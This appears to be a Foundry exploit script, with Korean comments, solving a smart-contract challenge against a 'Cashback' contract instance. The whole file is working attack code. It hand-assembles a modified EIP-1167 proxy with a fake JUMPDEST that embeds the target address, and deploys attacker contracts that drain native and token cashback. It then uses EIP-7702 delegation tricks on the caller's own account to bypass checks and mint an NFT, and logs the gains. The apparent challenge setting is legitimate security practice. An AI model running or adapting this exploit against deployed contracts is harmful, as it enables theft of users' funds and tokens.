// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import {Script, console} from "forge-std/Script.sol";
import {ICashback} from "src/ICashback.sol";
import {Attacker} from "src/Attacker.sol";
import {IERC721} from "@openzeppelin/contracts/token/ERC721/IERC721.sol";
import {IERC1155} from "@openzeppelin/contracts/token/ERC1155/IERC1155.sol";

contract CounterScript is Script {

    address constant currency = 0x13AaF3218Facf57CfBf5925E15433307b59BCC37;
    address constant nativeCurrency = 0xEeeeeEeeeEeEeeEeEeEeeEEEeeeeEeeeeeeeEEeE;

    ICashback constant target = ICashback(0x0D2fff4B8316dDB35931807bDe966F615fbB5217); // Instance 주소값(변동가능)
    IERC721 NFT;

    function setUp() public {
        NFT = IERC721(target.superCashbackNFT());
    }

    function run() public {
        
        uint256 pk = vm.envUint("PRIVATE_KEY");
        vm.startBroadcast();

        // logic을 구현체로 쓰면서 offset 0x17지점의 32바이트 값이 target주소인 변형 EIP1167 프록시 컨트랙트 구성

        Attacker logic = new Attacker();

        uint8 jumpDest = 3+20+32;
        bytes memory proxy = abi.encodePacked(
            hex"60", jumpDest, // PUSH1 jumpDest
            hex"56",           // JUMP
            uint160(address(target)),
            uint256(0), // false JUMPDEST 교정, null padding 추가함
            hex"5b",           // JUMPDEST
            hex"363d3d373d3d3d363d73", logic, hex"5af43d82803e903d91606357fd5bf3" // EIP1167에 따른 바이트코드
        );
        bytes memory deployCode = abi.encodePacked(
            hex"61", uint16(proxy.length),
            hex"80",
            hex"61", uint16(13),
            hex"6000",
            hex"39",
            hex"6000",
            hex"f3",
            proxy
        );


        Attacker attacker1;
        Attacker attacker2;
        assembly {
            attacker1 := create(0, add(deployCode, 0x20), mload(deployCode))
            attacker2 := create(0, add(deployCode, 0x20), mload(deployCode))
        }

        attacker1.setUp(target);
        attacker2.setUp(target);

        // attacker = 변형 프록시 구성됨, 공격

        vm.signAndAttachDelegation(address(0), pk);
        attacker1.attackNative();
        attacker2.attack();

        // delegated EOA 구성, nft 발행

        address eoa = vm.addr(pk);
        vm.signAndAttachDelegation(address(logic), pk);
        console.log("code length after delegation:", eoa.code.length);
        Attacker(eoa).setNonce();
        vm.signAndAttachDelegation(address(target), pk);
        ICashback(eoa).payWithCashback(nativeCurrency, address(eoa), 0);

        // 통과됐는지 확인

        console.log("my cashback:", IERC1155(address(target)).balanceOf(msg.sender, uint256(uint160(currency))));
        console.log("my native cashback:", IERC1155(address(target)).balanceOf(msg.sender, uint256(uint160(nativeCurrency))));
        console.log("my nft:", NFT.ownerOf(uint256(uint160(eoa))));

        vm.stopBroadcast();
    }
}
